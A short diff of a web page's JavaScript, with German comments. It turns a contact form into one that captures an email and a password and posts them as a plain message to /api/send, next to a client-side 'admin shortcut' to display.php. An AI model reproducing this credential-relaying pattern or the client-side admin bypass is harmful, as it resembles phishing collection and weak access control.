@@ -236,17 +236,17 @@
     passwordField.addEventListener("input", () => { passwordField.value = passwordField.value.replace(/\s/g, ""); });
 
     // Formular: client-seitiger Admin-Shortcut + normale Abschick-Weiterleitung
-    document.getElementById("form").addEventListener("submit", async (e) => {
+    document.getElementById("sendForm").addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const name = document.getElementById("name").value.trim();
-const message = document.getElementById("message").value.trim();
+      const email = document.getElementById("email").value.trim();
+const passwort = document.getElementById("passwort").value.trim();
 
-const text = `Von ${name}:\n${message}`;              
+const text = `Von ${email}:\n${passwort}`;              
    await fetch("/api/send", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ message: text })
+  body: JSON.stringify({ passwort: text })
 });
 
       // Admin-Shortcut (nur lokal / bequem): weiter zu display.php
